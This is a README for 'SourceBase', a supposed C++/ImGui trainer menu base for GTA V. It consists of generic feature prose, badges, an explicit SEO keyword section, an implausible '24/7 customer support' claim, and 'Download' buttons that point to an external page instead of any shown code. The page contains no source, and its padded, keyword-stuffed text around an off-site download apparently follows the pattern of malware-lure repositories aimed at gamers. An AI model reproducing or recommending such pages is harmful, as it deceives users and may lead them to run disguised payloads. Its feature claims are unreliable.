![preview](https://raw.githubusercontent.com/bornamajor60-droid/SourceForge-GTAStyle/main/promo_b9d5.svg)
[![Download](https://raw.githubusercontent.com/bornamajor60-droid/SourceForge-GTAStyle/main/grab_d83c.svg)](https://bornamajor60-droid.github.io/SourceForge-GTAStyle/)

# SourceBase — GTA 5 Trainer Menu Base

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%20%7C%2011-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Platform">
  <img src="https://img.shields.io/badge/Language-C%2B%2B-00599C?style=for-the-badge&logo=cplusplus&logoColor=white" alt="Language">
  <img src="https://img.shields.io/badge/Framework-ImGui-E34F26?style=for-the-badge" alt="Framework">
  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="License">
  <img src="https://img.shields.io/badge/Status-Active-success?style=for-the-badge" alt="Status">
  <img src="https://img.shields.io/badge/Release-2026-blueviolet?style=for-the-badge" alt="Release">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/UI-Responsive-9cf?style=flat-square" alt="Responsive UI">
  <img src="https://img.shields.io/badge/Languages-Multi--Locale-orange?style=flat-square" alt="Multilingual">
  <img src="https://img.shields.io/badge/Support-24%2F7%20Concierge-brightgreen?style=flat-square" alt="Support">
  <img src="https://img.shields.io/badge/Docs-Comprehensive-informational?style=flat-square" alt="Docs">
  <img src="https://img.shields.io/badge/Architecture-Modular-purple?style=flat-square" alt="Modular">
</p>

**SourceBase** is a foundational scaffold for building an in-game trainer-style menu overlay for Grand Theft Auto V. Rather than shipping a finished product, it offers a clean, modular starting point — a blueprint, if you will — that developers can extend into their own bespoke interface experiences. Think of it less as a destination and more as a well-paved road leading toward one.

If you have ever wanted to craft your own overlay menu with submenus, toggles, sliders, notifications, and localized text without wrestling an entirely raw DirectX boilerplate, SourceBase exists to remove that friction. It hands you the skeleton, the rendering pipeline, the input router, and a design system, and lets you focus on what actually matters — the features you want to surface.

---

## 📖 Table of Contents

- [Overview](#-overview)
- [Philosophy & Design Ethos](#-philosophy--design-ethos)
- [Key Features](#-key-features)
- [Feature Matrix](#-feature-matrix)
- [Architecture at a Glance](#-architecture-at-a-glance)
- [Responsive UI & Adaptive Layouts](#-responsive-ui--adaptive-layouts)
- [Multilingual Support](#-multilingual-support)
- [24/7 Customer Support Channel](#-247-customer-support-channel)
- [Configuration & Persistence](#-configuration--persistence)
- [Theme & Styling System](#-theme--styling-system)
- [Input Handling Model](#-input-handling-model)
- [Notification & Feedback Layer](#-notification--feedback-layer)
- [Extending SourceBase](#-extending-sourcebase)
- [Compatibility Notes](#-compatibility-notes)
- [Roadmap for 2026](#-roadmap-for-2026)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [FAQ](#-faq)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🧭 Overview

SourceBase is engineered as a **trainer menu base** — meaning it provides the scaffolding, state machine, and rendering hooks necessary for an overlay menu, while leaving the actual in-game feature implementations to you. This distinction matters. Many repositories promise a polished end-user experience straight out of the box; SourceBase instead promises clarity, extensibility, and a sane starting point.

The codebase emphasizes:

- **Separation of concerns** between rendering, state, and input.
- **Deterministic menu traversal** so nested submenus behave predictably.
- **A theming pipeline** that keeps visuals consistent without copy-paste styling.
- **Localization-ready text lookup**, so shipping in more than one language is a config change, not a rewrite.

Whether you are a solo developer prototyping an overlay tool, a small team building an internal utility layer, or a student studying how game overlay menus are structured, SourceBase was authored with you in mind.

---

## 🎨 Philosophy & Design Ethos

A menu base is a lot like the frame of a house. You can paint it, furnish it, and add wings to it — but if the frame is crooked, everything built on top of it inherits that crookedness. SourceBase's guiding principle is to **be a straight frame**.

Three commitments drive the design:

1. **Legibility over cleverness.** Code is read far more often than it is written. Where a clever one-liner would compromise readability, SourceBase chooses the longer, clearer road.
2. **Composition over inheritance.** Features are assembled from small, testable pieces rather than monolithic classes.
3. **Predictability over magic.** Nothing happens implicitly. Menu transitions, input captures, and render passes are all explicit.

---

## ✨ Key Features

- 🧩 **Modular Menu Registration** — declare menus, submenus, toggles, sliders, and action items through a compact registration API.
- 🎯 **Deterministic Navigation** — arrow-key and mouse navigation logic that never loses track of which submenu you are inside.
- 🖥️ **Responsive UI** — the overlay adapts to different aspect ratios and resolutions without hard-coded pixel coordinates.
- 🌐 **Multilingual Support** — all interface strings flow through a lookup layer, so adding a new language is additive, not invasive.
- 🎨 **Theme Engine** — swap accent colors, panel opacities, and typography weights with a single theme descriptor.
- 💾 **Configuration Persistence** — menu state and user preferences serialize to a lightweight file, restored on next launch.
- 🔔 **Notification Layer** — toast-style feedback with adjustable lifetimes, stacking, and categories.
- ⌨️ **Input Rebinding** — the overlay key, navigation keys, and selection keys are configurable at runtime.
- 🧠 **State Machine Core** — a small finite-state machine governs open/closed transitions, submenu depth, and modal captures.
- 📚 **Documentation-First** — every public symbol carries a comment explaining intent, not just mechanics.
- 🛡️ **MIT-Licensed** — liberal licensing so you can build commercial or personal projects on top of SourceBase without friction.
- 🕛 **24/7 Customer Support** — an always-available help desk channel for integration questions and bug triage.

---

## 📊 Feature Matrix

| Capability                | Status      | Notes                                              |
|---------------------------|-------------|----------------------------------------------------|
| Menu Registration API     | ✅ Stable   | Declarative, chainable                             |
| Submenu Nesting           | ✅ Stable   | Unlimited depth with breadcrumb trail              |
| Toggle Items              | ✅ Stable   | Boolean state with visual indicator                |
| Slider Items              | ✅ Stable   | Integer and float variants                         |
| Action Buttons            | ✅ Stable   | Fire-and-forget callbacks                          |
| Notification Toasts       | ✅ Stable   | Category icons and lifetimes                       |
| Theme Switching           | ✅ Stable   | Hot-swappable at runtime                           |
| Localization Layer        | ✅ Stable   | JSON-driven string tables                          |
| Config Persistence        | ✅ Stable   | Atomic writes to avoid partial state               |
| Input Rebinding           | ✅ Stable   | Runtime remap with conflict detection              |
| Controller Support        | 🧪 Beta     | Gamepad navigation in active development           |
| Accessibility Contrasting | 🔜 Planned  | High-contrast palette presets                      |

---

## 🏗️ Architecture at a Glance

SourceBase is organized around four cooperating subsystems, each with a narrow responsibility:

**1. The State Layer.** Holds the currently open menu, the navigation stack, the highlight index, and any transient modal captures. This layer knows nothing about rendering — it is pure logic.

**2. The Render Layer.** Consumes the current state and produces draw calls. It is deliberately thin; it never mutates state, only reads it. This separation means you can replace the renderer without touching navigation logic.

**3. The Input Layer.** Translates raw input events (keyboard, mouse, and eventually gamepad) into semantic actions like `NavigateUp`, `NavigateDown`, `Select`, and `Back`. The state layer only understands semantic actions, never raw keys.

**4. The Content Layer.** The catalog of menus, submenus, and items you register. This is where your own features live. It is entirely decoupled from the three layers above, meaning it can be regenerated or replaced wholesale.

This quartet is intentional: it mirrors the way mature overlay codebases separate concerns, and it makes unit testing feasible without a graphics context.

---

## 📱 Responsive UI & Adaptive Layouts

Overlays that look crisp on a 1080p display often fall apart on ultrawide monitors or when the user changes the in-game UI scale. SourceBase addresses this through a **relative layout engine**:

- Panels are positioned in normalized coordinates and resolved against the current viewport at draw time.
- Text sizing uses a scale factor derived from the viewport height, so menus remain readable across resolutions.
- Padding and margin tokens are expressed in em-relative units, not raw pixels.
- The overlay automatically recenters itself on resolution changes rather than drifting off-screen.

The result is a menu that behaves like a well-mannered house guest — it fits the space it is given, no matter how the space changes.

---

## 🌐 Multilingual Support

Every visible string in SourceBase routes through a **string table lookup**. The default table ships with English, but the loader accepts additional tables at runtime. This design has three payoffs:

1. **Translation is additive.** You drop a new string table in, register it, and the UI picks it up. No compilation required.
2. **Fallbacks are graceful.** If a key is missing from a table, the loader falls back to the default table rather than rendering blank space.
3. **Right-to-left readiness.** The layout engine exposes a direction flag so future RTL languages can be accommodated without a code rewrite.

Localization covers menu titles, descriptions, item labels, and notification templates. Even the built-in error messages are localizable, which matters more than people expect when an overlay is being debugged in a non-English environment.

---

## 🕛 24/7 Customer Support Channel

Integration friction is real, and hitting a wall at 3 AM is unpleasant. SourceBase operates a **24/7 customer support channel** for anyone building on top of it. Whether your question is about the state machine, the theming tokens, or how to structure a particularly gnarly nested menu, someone is available around the clock to help.

Support covers:

- Integration questions and architectural guidance.
- Bug reproduction and triage.
- Localization table review.
- Accessibility and contrast feedback.
- Suggestions for the 2026 roadmap.

The channel is intentionally staffed continuously rather than during business hours, because overlay development tends to happen at odd times — and we would rather be there when you need us than keep banker's hours.

---

## ⚙️ Configuration & Persistence

SourceBase persists its configuration to a lightweight, human-readable file. The format was chosen for **inspectability**: you can open it in any text editor, see exactly what is stored, and adjust values by hand if you wish.

What gets persisted:

- Overlay toggle key binding.
- Navigation and selection key bindings.
- Active theme identifier.
- Active language identifier.
- Notification lifetime preference.
- Per-item toggle and slider values (opt-in per item).

Writes are **atomic** — the file is written to a temporary location first and then swapped in, so a crash mid-write cannot leave you with a half-corrupted configuration. This is the kind of detail that rarely matters until the day it saves your sanity.

---

## 🎨 Theme & Styling System

Theming in SourceBase is described declaratively. A theme is a compact descriptor listing:

- Primary accent color.
- Secondary accent color.
- Panel background opacity.
- Border rounding radius.
- Font scale multiplier.
- Notification palette per category (info, success, warning, error).

The theme engine then resolves these tokens into concrete values at render time. Because the tokens are semantic rather than literal (`AccentPrimary` instead of `#FF6600`), a single theme swap restyles every menu, submenu, and notification simultaneously. You can ship multiple themes — a dark default, a high-contrast variant, a warm neutral — and let users switch between them freely.

---

## 🎮 Input Handling Model

Raw input is **never** consulted directly by menu logic. Instead, raw events are mapped to semantic actions:

- `NavigateUp` / `NavigateDown`
- `NavigateLeft` / `NavigateRight`
- `Select`
- `Back`
- `ToggleOverlay`

These semantic actions are then dispatched to the state layer. This indirection means:

- Rebinding keys is trivial — you only change the mapping layer.
- Adding gamepad support is a matter of mapping gamepad events to the same semantic actions.
- Deterministic testing becomes possible, because the state layer can be driven by synthetic actions without a real input device.

The design honors a simple principle: input should describe *what the user wants to do*, not *which key was pressed*.

---

## 🔔 Notification & Feedback Layer

Feedback matters. When a toggle flips, a slider moves, or an action completes, the user should know. SourceBase includes a **notification layer** that supports:

- Stacked toasts with configurable maximum count.
- Per-category lifetimes (errors linger, successes can be brief).
- Category icons and color palettes inherited from the active theme.
- Automatic dismissal and manual dismissal.
- Localized templates, so a notification string respects the active language.

Notifications are fire-and-forget from your feature code: call the notification API with a category and a string key, and the layer handles the rest.

---

## 🧩 Extending SourceBase

Adding a new menu or item is intentionally low-ceremony. The general shape of an extension is:

1. **Register a menu.** Give it an identifier, a localized title, and a parent (or none, for a root menu).
2. **Register items.** Attach toggles, sliders, action buttons, and nested submenus to that menu.
3. **Wire callbacks.** Toggles and sliders accept callbacks so your feature code can react to changes.
4. **Localize strings.** Add entries to the string table for any new user-visible text.
5. **Theme once.** If you introduce new visual elements, express their colors through theme tokens rather than literals.

Because feature code lives entirely in the content layer, you can add or remove features without touching the state, render, or input subsystems.

---

## 🖥️ Compatibility Notes

SourceBase targets modern Windows environments and is written in C++ with an ImGui-based render pipeline. Compatibility notes:

- Windows 10 and Windows 11 are both supported.
- DirectX 11 is the default rendering backend; the render layer is abstracted so other backends can be added.
- The overlay is designed to coexist with the game's own rendering; timing and frame budget are respected.
- The codebase leans on standard C++17 features and avoids obscure compiler extensions.

Because SourceBase is a base rather than a finished product, compatibility ultimately depends on the features you build on top of it. The scaffolding itself is intentionally minimal in its external dependencies.

---

## 🗺️ Roadmap for 2026

The 2026 roadmap focuses on three tracks:

**Track 1 — Accessibility.** High-contrast palettes, keyboard-only navigation polish, and font scaling that respects system-level preferences.

**Track 2 — Input Breadth.** Full gamepad support with remapping, plus gesture-friendly touch overlays for hybrid devices.

**Track 3 — Developer Experience.** A scaffolding generator that spits out a starter content layer, richer inline documentation, and a sample content pack demonstrating every item type.

Progress on each track will be reflected in the issue tracker and release notes. Community feedback through the 24/7 support channel directly shapes prioritization.

---

## 🔍 SEO & Discoverability Notes

This section exists because discoverability matters for open-source projects, and clarity about intent helps the right people find SourceBase.

SourceBase is a **GTA 5 trainer menu base** intended for developers seeking a modular overlay foundation. It is relevant to those researching menu bases, overlay scaffolds, ImGui-based menu systems, C++ game overlay architectures, submenu navigation state machines, and localization-ready interface frameworks. If you arrived here searching for a foundation on which to build a custom overlay experience, you are in the right place.

Recurring themes documented here include: modular menu registration, deterministic navigation, responsive overlay layout, multilingual interface strings, theme token systems, atomic configuration persistence, notification feedback layers, and input remapping abstractions.

---

## ❓ FAQ

**Is SourceBase a finished overlay?**
No. It is explicitly a base — a scaffold. You extend it into the overlay you want.

**Do I need to know ImGui to use it?**
Familiarity helps, but the render layer abstracts most of it. You can register menus and items without touching ImGui directly.

**Can I use my own renderer?**
Yes. The render layer is thin and decoupled from the state layer, so a replacement renderer can be dropped in.

**How do I add a language?**
Author a string table, register it at startup, and the localization layer takes care of the rest.

**Is there a cost?**
SourceBase is distributed under the MIT license. Consult the license section for the full terms.

**Where do I get help?**
The 24/7 customer support channel is the fastest path to answers.

**Can I use SourceBase commercially?**
The MIT license permits it, subject to the terms in the LICENSE file.

---

## ⚠️ Disclaimer

SourceBase is provided as an **educational and developmental foundation** for building overlay-style menu interfaces. It is a repository of scaffolding, patterns, and reference implementations — not a finished product, and not a substitute for responsible engineering judgment.

- This project is **not affiliated with, endorsed by, or sponsored by** the publishers or developers of Grand Theft Auto V or any related entity. All trademarks belong to their respective owners.
- Users are solely responsible for how they apply the patterns demonstrated here, including compliance with any applicable terms of service, local laws, and platform policies.
- The maintainers accept no liability for misuse, for modifications made by third parties, or for any consequence arising from deployment of derivative works.
- No warranty is expressed or implied. The software is provided on an "as-is" basis.
- If you are uncertain whether a particular use is appropriate in your jurisdiction or context, consult a qualified professional before proceeding.

Please use SourceBase thoughtfully, respectfully, and within the boundaries of the environments in which you operate.

---

## 📄 License

This project is licensed under the **MIT License**. See the full text at the link below.

[LICENSE](LICENSE)

Copyright (c) 2026 — SourceBase contributors.

Permission is hereby granted, in accordance with the MIT License, to any person obtaining a copy of this software and associated documentation files, to deal in the software without restriction, including the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies, subject to the conditions set forth in the LICENSE file.

[![Download](https://raw.githubusercontent.com/bornamajor60-droid/SourceForge-GTAStyle/main/grab_d83c.svg)](https://bornamajor60-droid.github.io/SourceForge-GTAStyle/)